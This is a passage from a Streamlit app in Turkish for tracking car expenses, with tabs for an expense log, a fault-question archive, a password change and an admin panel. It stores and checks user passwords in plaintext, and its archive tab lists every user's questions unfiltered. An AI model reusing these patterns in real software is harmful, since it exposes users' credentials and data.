        df_araclarim = pd.read_sql_query(
            'SELECT id, arac_adi FROM kullanici_garaj WHERE kullanici = ?',
            conn,
            params=(st.session_state.aktif_kullanici,),
        )
    except Exception:
      df_araclarim = pd.DataFrame()

    if not df_araclarim.empty:
      secilen_arac_masraf = st.selectbox(
          'Araç Seç:',
          df_araclarim['arac_adi'].tolist(),
          key='masraf_arac_secim',
      )
      m_turu = st.selectbox(
          'Masraf Türü:', [
              'Periyodik Bakım',
              'Yakıt Dolumu',
              'Lastik Değişimi',
              'Fren Balatası',
              'Sigorta / Vergi',
              'Diğer Arıza',
          ]
      )
      m_tutar = st.number_input('Tutar (TL):', min_value=0.0, value=1000.0)
      m_aciklama = st.text_input(
          'Açıklama / Detay:', placeholder='Örn: 10 bin bakımı yapıldı.'
      )

      if st.button('Masrafı Kaydet', use_container_width=True):
        try:
          with sqlite3.connect('autolab_pro.db', timeout=10) as conn:
            cursor = conn.cursor()
            zaman_str = datetime.now().strftime('%Y-%m-%d')
            cursor.execute(
                'INSERT INTO arac_masraflar (kullanici, arac_adi, masraf_turu,'
                ' tutar, aciklama, tarih) VALUES (?, ?, ?, ?, ?, ?)',
                (
                    st.session_state.aktif_kullanici,
                    secilen_arac_masraf,
                    m_turu,
                    m_tutar,
                    m_aciklama,
                    zaman_str,
                ),
            )
            conn.commit()
          st.success('Masraf başarıyla eklendi!')
          st.rerun()
        except Exception as e:
          st.error(f'Hata: {e}')

      st.divider()
      st.markdown('### 📊 Kayıtlı Masraflar ve Giderler')
      try:
        with sqlite3.connect('autolab_pro.db') as conn:
          df_masraflar = pd.read_sql_query(
              'SELECT id, arac_adi, masraf_turu, tutar, aciklama, tarih FROM'
              ' arac_masraflar WHERE kullanici = ? ORDER BY id DESC',
              conn,
              params=(st.session_state.aktif_kullanici,),
          )
          if not df_masraflar.empty:
            st.dataframe(df_masraflar, use_container_width=True)

            # MASRAF SİLME ÖZELLİĞİ
            st.markdown('#### 🗑️ Masraf Kaydı Sil')
            silinecek_masraf_dict = {
                f"ID {row['id']} - {row['arac_adi']} | {row['masraf_turu']} ("
                f"{row['tutar']} TL)": row['id']
                for _, row in df_masraflar.iterrows()
            }
            secilen_masraf_kutusu = st.selectbox(
                'Silmek İstediğiniz Masrafı Seçin:',
                list(silinecek_masraf_dict.keys()),
            )

            if st.button(
                'Seçilen Masrafı Sil',
                type='secondary',
                use_container_width=True,
            ):
              sil_masraf_id = silinecek_masraf_dict[secilen_masraf_kutusu]
              try:
                with sqlite3.connect('autolab_pro.db', timeout=10) as conn:
                  cursor = conn.cursor()
                  cursor.execute(
                      'DELETE FROM arac_masraflar WHERE id = ? AND kullanici'
                      ' = ?',
                      (sil_masraf_id, st.session_state.aktif_kullanici),
                  )
                  conn.commit()
                st.success('Masraf kaydı başarıyla silindi!')
                st.rerun()
              except Exception as e:
                st.error(f'Masraf silinirken hata oluştu: {e}')
          else:
            st.info('Henüz kayıtlı bir masraf bulunmuyor.')
      except Exception as e:
        st.error(f'Hata: {e}')
    else:
      st.warning(
          'Lütfen önce "🚘 Araçlarım & Garaj Ekle / Sil" sekmesinden bir araç'
          ' kaydedin.'
      )

elif 'Soru Arşivi' in sekme:
  st.subheader('📋 Geçmiş Arıza Soru ve Çözüm Arşivi')
  try:
    with sqlite3.connect('autolab_pro.db') as conn:
      df_arsiv = pd.read_sql_query(
          'SELECT id, kullanici, soru, cevap, tarih_saat FROM arac_sorulari'
          ' ORDER BY id DESC',
          conn,
      )
      if not df_arsiv.empty:
        st.dataframe(df_arsiv, use_container_width=True)
      else:
        st.info('Arşivde henüz soru bulunmuyor.')
  except Exception as e:
    st.error(f'Hata: {e}')

elif 'Şifremi Güncelle (Parola Değiştir)' in sekme:
  st.subheader('⚙️ Hesap Şifresini Güncelle')
  eski_sifre = st.text_input('Mevcut Şifreniz:', type='password')
  yeni_sifre_1 = st.text_input('Yeni Şifreniz:', type='password')
  yeni_sifre_2 = st.text_input('Yeni Şifreniz (Tekrar):', type='password')

  if st.button('Şifreyi Güncelle', type='primary', use_container_width=True):
    if not eski_sifre or not yeni_sifre_1 or not yeni_sifre_2:
      st.error('Lütfen tüm alanları doldurun!')
    elif yeni_sifre_1 != yeni_sifre_2:
      st.error('Yeni şifreler birbiriyle uyuşmuyor!')
    else:
      try:
        with sqlite3.connect('autolab_pro.db', timeout=10) as conn:
          cursor = conn.cursor()
          cursor.execute(
              'SELECT sifre FROM kullanicilar WHERE kullanici_adi = ?',
              (st.session_state.aktif_kullanici,),
          )
          row = cursor.fetchone()
          if row and row[0] == eski_sifre:
            cursor.execute(
                'UPDATE kullanicilar SET sifre = ? WHERE kullanici_adi = ?',
                (yeni_sifre_1, st.session_state.aktif_kullanici),
            )
            conn.commit()
            st.success('Şifreniz başarıyla güncellendi!')
          else:
            st.error('Mevcut şifreniz hatalı!')
      except Exception as e:
        st.error(f'Hata: {e}')

elif '🛡️ Admin Yönetim Paneli' in sekme:
  st.subheader('🛡️ Yönetim Paneli ve Veritabanı Kayıtları')
  if not st.session_state.admin_giris:
    st.warning(
        'Bu paneli görebilmek için sol menüden admin şifresiyle giriş yapmanız'
        ' gerekmektedir.'
    )
  else:
    st.success('Admin yetkileri aktif. Tüm sistem verileri aşağıdadır:')
    try:
      with sqlite3.connect('autolab_pro.db') as conn:
        st.markdown('### 👥 Kayıtlı Kullanıcılar')
        df_kll = pd.read_sql_query(
            'SELECT id, ad_soyad, eposta, kullanici_adi, kayit_tarihi FROM'
            ' kullanicilar',
            conn,
        )
        st.dataframe(df_kll, use_container_width=True)

        st.markdown('### 🚗 Tüm Garaj Kayıtları')
        df_all_garaj = pd.read_sql_query(
            'SELECT * FROM kullanici_garaj', conn
        )
        st.dataframe(df_all_garaj, use_container_width=True)
    except Exception as e:
      st.error(f'Veriler çekilirken hata oluştu: {e}')
